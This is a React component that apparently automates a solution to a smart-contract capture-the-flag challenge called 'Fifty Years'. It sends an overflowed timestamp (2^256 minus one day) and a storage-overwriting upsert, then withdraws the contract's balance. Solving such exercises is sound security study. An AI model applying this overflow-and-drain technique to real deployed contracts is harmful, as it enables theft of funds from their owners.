import React from 'react';
import loadInstance from '../utilities/loadInstance';
import CaptureRow from "./CaptureRow";
import { getNetworkContract } from '../utilities/networkUtilities';
// import { getTransactionReceipt } from '../utilities/getTransactionReceipt';
import { BigNumber } from 'ethers';

const fiftyYearsAbi = require('../abi/FiftyYearsChallenge.json').abi;
const secondsPerDay = 24 * 60 * 60;
const overflowedDate = BigNumber.from(`2`).pow(`256`).sub(secondsPerDay);

export default function FiftyYears (props) {
    const [fiftyYearsInstance, setFiftyYearsInstance] = React.useState();
    const [isComplete, setIsComplete] = React.useState(undefined);
    const [balance, setBalance] = React.useState();

    if (props.web3 && props.accounts && props.networkType) {
        if (!fiftyYearsInstance)
            loadInstance(fiftyYearsAbi, getNetworkContract(props.networkType, "FiftyYearsChallengeContract"), setFiftyYearsInstance, props.accounts, props.web3);
    }

    const OnClickFiftyYears = async (event) => {
        event.preventDefault();
        if (!isComplete) {
            debugger;
            // the index increment actually increases the amount stored since its overwriting
            // and incrementing the value being stored.  RetirementFundAttacker added 2 wei in the deployment
            if (balance === "1.000000000000000002")
            {
                await fiftyYearsInstance.methods.upsert(`1`, overflowedDate.toString()).send({ from: props.accounts[0], value: `1` });
            }
            if (balance === "1.000000000000000003")
            {
                await fiftyYearsInstance.methods.upsert(`2`, '0').send({ from: props.accounts[0], value: `2` });
            }
            if (balance === "1.000000000000000005") {
                await fiftyYearsInstance.methods.withdraw('2').send({ from: props.accounts[0] });
            }
            checkCompleted();
        }
        else
            alert(`already completed`)
    }

    const getButton = () => {
        return (
            <>
                <button disabled={!fiftyYearsInstance} onClick={OnClickFiftyYears}>FiftyYears</button>
            </>
        );
    }

    const checkCompleted = () => {
        if (props.web3 && props.accounts && fiftyYearsInstance) {
            console.log(`fiftyYears.checkCompleted`);
            fiftyYearsInstance.methods.isComplete().call().then(completed => setIsComplete(completed), 
                err => alert(`fiftyYears.isComplete: ${err}`));
            props.web3.eth.getBalance(fiftyYearsInstance._address).then(balance => {
                var wei = props.web3.utils.fromWei(balance);
                setBalance(wei);
            }, err => alert(`fiftyYears.getBalance: ${err}`));
        }
    }

    const getCompleted = () => {
        if (!fiftyYearsInstance) {
            return "loading";
        }
        checkCompleted();
        return isComplete ? "true" : "false";
    }

    return (
        <CaptureRow name="FiftyYears" blocks="" action={getButton()} balance={balance} completed={getCompleted()} />
    );
}
